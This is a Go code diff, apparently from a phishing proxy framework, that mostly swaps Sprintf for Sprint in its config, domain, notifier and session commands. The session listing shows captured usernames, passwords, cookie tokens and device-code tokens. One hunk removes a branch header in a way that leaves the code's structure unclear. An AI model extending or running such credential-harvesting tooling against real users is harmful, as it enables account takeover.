@@ -533,9 +533,6 @@ func (t *Terminal) handleConfig(args []string) error {
 				}
 				return nil
 			}
-		}
-	} else if pn == 2 {
-		switch args[0] {
 		case "telegram":
 			switch args[1] {
 			case "test":
@@ -982,14 +979,14 @@ func (t *Terminal) handleDomains(args []string) error {
 
 			status := "configured"
 			if d.Provider != "internal" && d.Provider != "" {
-				if d.Credentials == nil || len(d.Credentials) == 0 {
-					status = yellow.Sprintf("needs credentials")
+				if len(d.Credentials) == 0 {
+					status = yellow.Sprint("needs credentials")
 				} else {
-					status = higreen.Sprintf("ready")
+					status = higreen.Sprint("ready")
 				}
 			}
 
-			row := []string{hiblue.Sprintf(d.Domain), hiyellow.Sprintf(provider), status}
+			row := []string{hiblue.Sprint(d.Domain), hiyellow.Sprint(provider), status}
 			rows = append(rows, row)
 		}
 		log.Printf("\n%s\n", AsTable(cols, rows))
@@ -1132,8 +1129,8 @@ func (t *Terminal) handleNotify(args []string) error {
 			return nil
 		}
 
-		t.output("%s", hiblue.Sprintf("\n notifiers\n"))
-		t.output("%s", hiblue.Sprintf(strings.Repeat("=", 60)))
+		t.output("%s", hiblue.Sprint("\n notifiers\n"))
+		t.output("%s", hiblue.Sprint(strings.Repeat("=", 60)))
 
 		columns := []string{"name", "channel", "enabled", "triggers"}
 		var rows [][]string
@@ -1141,14 +1138,14 @@ func (t *Terminal) handleNotify(args []string) error {
 		for _, n := range notifiers {
 			var enabledStr string
 			if n.Enabled {
-				enabledStr = green.Sprintf("yes")
+				enabledStr = green.Sprint("yes")
 			} else {
-				enabledStr = red.Sprintf("no")
+				enabledStr = red.Sprint("no")
 			}
 
 			channelStr := n.Channel
 			if channelStr == "" {
-				channelStr = yellow.Sprintf("not set")
+				channelStr = yellow.Sprint("not set")
 			}
 
 			// Build triggers string
@@ -1160,10 +1157,10 @@ func (t *Terminal) handleNotify(args []string) error {
 			}
 			triggersStr := strings.Join(triggers, ", ")
 			if len(triggers) == 0 {
-				triggersStr = yellow.Sprintf("none")
+				triggersStr = yellow.Sprint("none")
 			}
 
-			rows = append(rows, []string{higreen.Sprintf(n.Name), channelStr, enabledStr, triggersStr})
+			rows = append(rows, []string{higreen.Sprint(n.Name), channelStr, enabledStr, triggersStr})
 		}
 		t.output("\n%s\n", AsTable(columns, rows))
 		return nil
@@ -1239,15 +1236,15 @@ func (t *Terminal) handleNotify(args []string) error {
 			}
 
 			t.output("%s", hiblue.Sprintf("\n notifier: %s\n", n.Name))
-			t.output("%s", hiblue.Sprintf(strings.Repeat("=", 50)))
+			t.output("%s", hiblue.Sprint(strings.Repeat("=", 50)))
 
 			// Basic info
 			enabledStr := "no"
 			if n.Enabled {
-				enabledStr = green.Sprintf("yes")
+				enabledStr = green.Sprint("yes")
 			}
-			t.output("\n %s: %s", cyan.Sprintf("enabled"), enabledStr)
-			t.output("\n %s: %s", cyan.Sprintf("channel"), hiyellow.Sprintf(n.Channel))
+			t.output("\n %s: %s", cyan.Sprint("enabled"), enabledStr)
+			t.output("\n %s: %s", cyan.Sprint("channel"), hiyellow.Sprint(n.Channel))
 
 			// Channel-specific config
 			switch n.Channel {
@@ -1284,10 +1281,10 @@ func (t *Terminal) handleNotify(args []string) error {
 			}
 
 			// Templates
-			t.output("\n\n %s:", cyan.Sprintf("templates"))
+			t.output("\n\n %s:", cyan.Sprint("templates"))
 			for _, evt := range AllEventTypes {
 				if tmpl, ok := n.Templates[evt]; ok {
-					t.output("\n   %s:", higreen.Sprintf(evt))
+					t.output("\n   %s:", higreen.Sprint(evt))
 					t.output("\n     subject: %s", tmpl.Subject)
 					t.output("\n     body: %s", tmpl.Body)
 				}
@@ -1492,8 +1489,8 @@ func (t *Terminal) handleNotify(args []string) error {
 			return nil
 
 		case "help":
-			t.output("%s", hiblue.Sprintf("\nEvent Notification Commands:\n"))
-			t.output("%s", hiblue.Sprintf(strings.Repeat("=", 60)))
+			t.output("%s", hiblue.Sprint("\nEvent Notification Commands:\n"))
+			t.output("%s", hiblue.Sprint(strings.Repeat("=", 60)))
 			t.output("\n  %s - %s", hiyellow.Sprintf("notify"), "list all notifiers")
 			t.output("\n  %s - %s", hiyellow.Sprintf("notify create <name>"), "create a new notifier")
 			t.output("\n  %s - %s", hiyellow.Sprintf("notify delete <name>"), "delete a notifier")
@@ -1626,13 +1623,13 @@ func (t *Terminal) handleSessions(args []string) error {
 		}
 		var rows [][]string
 		for _, s := range sessions {
-			tcol := dgray.Sprintf("none")
+			tcol := dgray.Sprint("none")
 			if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
-				tcol = lgreen.Sprintf("captured")
+				tcol = lgreen.Sprint("captured")
 			} else if s.Custom["dc_refresh_token"] != "" || s.Custom["dc_access_token"] != "" {
-				tcol = cyan.Sprintf("dc_tokens")
+				tcol = cyan.Sprint("dc_tokens")
 			}
-			row := []string{strconv.Itoa(s.Id), lred.Sprintf(s.Phishlet), lblue.Sprintf(truncateString(s.Username, 24)), lblue.Sprintf(truncateString(s.Password, 24)), tcol, yellow.Sprintf(s.RemoteAddr), time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04")}
+			row := []string{strconv.Itoa(s.Id), lred.Sprint(s.Phishlet), lblue.Sprint(truncateString(s.Username, 24)), lblue.Sprint(truncateString(s.Password, 24)), tcol, yellow.Sprint(s.RemoteAddr), time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04")}
 			rows = append(rows, row)
 		}
 		log.Printf("\n%s\n", AsTable(cols, rows))
